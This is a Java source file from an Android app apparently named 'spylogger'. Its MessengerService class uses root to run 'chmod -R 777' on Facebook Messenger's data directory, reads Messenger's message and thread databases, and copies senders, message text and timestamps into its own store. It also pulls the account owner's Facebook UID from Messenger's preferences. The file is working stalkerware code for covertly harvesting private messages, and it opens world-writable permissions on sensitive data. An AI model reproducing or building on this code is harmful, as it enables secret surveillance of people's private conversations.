package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.messenger.Contact;
import com.gravatasufoca.spylogger.model.messenger.Messages;
import com.gravatasufoca.spylogger.model.messenger.Prefs;
import com.gravatasufoca.spylogger.model.messenger.Sender;
import com.gravatasufoca.spylogger.model.messenger.Thread;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class MessengerService  implements Mensageiro{
    private String inFileName;

    private Contact proprietario;
    private Context context;


    public MessengerService(Context context) {
        if (context != null) {
            this.context = context;
            onCreate();
        }
    }


    private void chmod() {

        try {
            CommandCapture command = new CommandCapture(0, "chmod -R 777 "
                    + Utils.FACEBOOK_DIR_PATH, "chmod -R 777 "
                    + context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir);

            if (RootTools.isAccessGiven())
                RootTools.getShell(true).add(command);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void onCreate() {
        try {
            inFileName = context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir
                    + "/databases/" + DatabaseHelper.DATABASE_NAME;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }

        chmod();
    }


    public void start() {

        if ((new File(DatabaseHelperFacebookThreads.DATABASE_NAME)).exists()) {
            updateTopicos();
        }
    }

    private synchronized void updateTopicos() {
        DatabaseHelperFacebookThreads external = new DatabaseHelperFacebookThreads(context);
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Messages, Integer> daoMsgExternal;
        GenericRawResults<Object[]> raws = null;
        try {
            dbHelper.getWritableDatabase();
            daoMsgExternal = external.getMessagesDao();

            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");

            raws = daoMsgExternal.queryRaw("select thread_key,snippet,senders,snippet_sender, timestamp_ms from threads where thread_key not in( select idReferencia from localdb.topico where tipoMensagem=1 )",
                    new DataType[]{DataType.STRING, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG});

            List<Topico> tt = new ArrayList<>();
            Iterator<Object[]> iterator = raws.iterator();
            int contador = 0;
            while (iterator.hasNext()) {

                Object[] raw = iterator.next();

                Thread thread = new Thread();
                thread.setThread_key((String) raw[0]);
                thread.setSnippet(raw[1] != null ? (String) raw[1] : null);
                thread.setTsenders(raw[2] != null ? (String) raw[2] : null);
                thread.setTsnippet_sender(raw[3] != null ? (String) raw[3] : null);
                thread.setTimestamp_ms(raw[4] != null ? (Date) raw[4] : null);

                Topico topico = new Topico.TopicoBuilder()
                        .setIdReferencia(thread.getThread_key())
                        .setNome(thread.getNomes(context,proprietario))
                        .setGrupo(thread.getSenders() != null && thread.getSenders().size() > 2)
                        .build(TipoMensagem.MESSENGER);
                tt.add(topico);
                contador++;
                if (iterator.hasNext()) {
                    if (contador == 500) {
                        contador = 0;
                        dbHelper.getDao(Topico.class).create(tt);
                        tt = new ArrayList<>();
                    }
                } else {
                    dbHelper.getDao(Topico.class).create(tt);
                }
            }

            updateMsg(tt);

        } catch (Exception e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        } finally {
            try {
                if (raws != null) {
                    raws.close();
                }
                if(dbHelper!=null){
                    dbHelper.close();
                }
                if(external!=null){
                    external.close();
                }
            } catch (IOException e) {
            }
        }

    }


    private synchronized void updateMsg(List<Topico> tt) {

        DatabaseHelperFacebookThreads external = new DatabaseHelperFacebookThreads(context);
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Messages, Integer> daoMsgExternal;

        GenericRawResults<Object[]> rawResults = null;
        try {
            daoMsgExternal = external.getMessagesDao();

            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");

            rawResults = daoMsgExternal.queryRaw("select msg_id,thread_key,text,sender,timestamp_ms from messages where msg_id not in( select idReferencia from localdb.mensagem )",
                    new DataType[]{DataType.STRING, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG});

            Iterator<Object[]> iterator = rawResults.iterator();

            List<Mensagem> mensagens = new ArrayList<>();
            int contador = 0;
            while (iterator.hasNext()) {
                Object[] raw = iterator.next();

                Messages message = new Messages();
                message.setMsg_id(raw[0] != null ? (String) raw[0] : null);
                message.setThread_key(raw[1] != null ? (String) raw[1] : null);
                message.setText(raw[2] != null ? (String) raw[2] : null);
                message.setTsender(raw[3] != null ? (String) raw[3] : null);
                message.setTimestamp_ms(raw[4] != null ? (Date) raw[4] : null);

                Sender sender = message.getSender();
                if (sender == null) continue;
                Contact contato = sender.getContato(context);
                boolean remetente = contato.equals(proprietario);

                Topico tmpTopico = null;
                for (Topico topico : tt) {
                    if (message.getThread_key().equals(topico.getIdReferencia())) {
                        tmpTopico = topico;
                        break;
                    }
                }
                if (tmpTopico == null) {
                    tmpTopico = dbHelper.getDao(Topico.class).queryForFirst(dbHelper.getDao(Topico.class).queryBuilder().where().eq("idReferencia", message.getThread_key()).prepare());
                }

                Mensagem mensagem = new Mensagem.MensagemBuilder()
                        .setIdReferencia(message.getMsg_id())
                        .setRemetente(remetente)
                        .setTexto(message.getText())
                        .setData(message.getTimestamp_ms())
                        .setDataRecebida(message
                                .getTimestamp_ms())
                        .setTamanhoArquivo(0)
                        .setTipoMidia(TipoMidia.TEXTO)
                        .setContato(sender.getNome())
                        .setTopico(tmpTopico)
                        .setTemMedia(false).build();

                mensagens.add(mensagem);
                contador++;
                if (iterator.hasNext()) {
                    if (contador == 10000) {
                        contador = 0;
                        dbHelper.getDao(Mensagem.class).create(mensagens);
                        mensagens = new ArrayList<>();
                    }
                } else {
                    dbHelper.getDao(Mensagem.class).create(mensagens);
                }
            }

            Log.i(this.getClass().getSimpleName(), "TERMINOU");
        } catch (Exception e) {
            try {
                if (rawResults != null) {
                    rawResults.close();
                }
                if(dbHelper!=null){
                    dbHelper.close();
                }
                if(external!=null){
                    external.close();
                }
            } catch (IOException ee) {
            }
        }
    }

    private Contact getProprietario(Context context) {
        try {

            String uid = context.getSharedPreferences(Utils.PREF, 0).getString("UID", "");
            if (!uid.isEmpty())
                return Utils.getContato(context,uid);

            Dao<Prefs, Integer> dao = (new DatabaseHelperFacebookPrefs(context)).getPrefsDao();
            List<Prefs> prefs = dao.queryForAll();

            for (Prefs pref : prefs) {
                if (pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_uid")) {
                    context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", pref.getValue()).commit();

                    return Utils.getContato(context,pref.getValue());
                } else if (pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_me_user")) {
                    try {
                        JSONObject json = new JSONObject(pref.getValue());
                        context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", json.getString("uid")).commit();

                        return Utils.getContato(context,json.getString("uid"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }

            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
        return new Contact();
    }
}